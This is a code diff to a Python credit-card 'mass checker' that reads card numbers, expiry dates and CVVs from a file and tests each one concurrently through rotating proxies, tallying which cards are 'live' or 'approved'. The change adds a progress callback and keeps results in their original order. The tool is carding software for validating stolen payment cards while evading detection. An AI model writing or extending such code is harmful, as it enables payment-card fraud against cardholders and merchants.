@@ -269,7 +269,11 @@ async def check_card(cc, mes, ano, cvv, proxy=None):
 
 # ─────────────────────── mass checker ────────────────────────────────
 
-async def mass_check(file_path, proxies=None, concurrency=10):
+async def mass_check(file_path, proxies=None, concurrency=10, progress_callback=None):
+    """
+    mass_check with optional progress_callback.
+    progress_callback(result, completed, total) is called after each card.
+    """
     if proxies is None:
         proxies = []
     cc_lines = []
@@ -286,24 +290,29 @@ async def mass_check(file_path, proxies=None, concurrency=10):
         print(f"{Fore.YELLOW}⚠️ No cards to check.")
         return []
     sem = asyncio.Semaphore(concurrency)
-    results = []
+    results = [None] * len(cc_lines)
     completed = 0
 
-    async def worker(cc_line):
+    async def worker(index, cc_line):
         nonlocal completed
         async with sem:
             parts = cc_line.strip().split('|')
             if len(parts) != 4:
-                return {'cc': cc_line, 'status': f'{Fore.RED}❌ Invalid', 'response': 'Invalid format', 'is_live': False}
-            cc, mes, ano, cvv = parts
-            proxy = random.choice(proxies) if proxies else None
-            result = await check_card(cc, mes, ano, cvv, proxy=proxy)
+                result = {'cc': cc_line, 'status': f'{Fore.RED}❌ Invalid', 'response': 'Invalid format', 'is_live': False}
+            else:
+                cc, mes, ano, cvv = parts
+                proxy = random.choice(proxies) if proxies else None
+                result = await check_card(cc, mes, ano, cvv, proxy=proxy)
+            results[index] = result
             completed += 1
             print(f"{Fore.CYAN}[{completed}/{len(cc_lines)}] {result['cc']} → {result['status']}{Style.RESET_ALL} | Response: {result['response']}")
+            if progress_callback:
+                await progress_callback(result, completed, len(cc_lines))
             return result
 
-    tasks = [asyncio.create_task(worker(line)) for line in cc_lines]
-    results = await asyncio.gather(*tasks)
+    tasks = [asyncio.create_task(worker(i, line)) for i, line in enumerate(cc_lines)]
+    await asyncio.gather(*tasks)
+    results = [r for r in results if r is not None]
     approved = sum(1 for r in results if r['is_live'])
     declined = sum(1 for r in results if not r['is_live'] and 'Invalid' not in r['status'])
     errors = len(results) - approved - declined
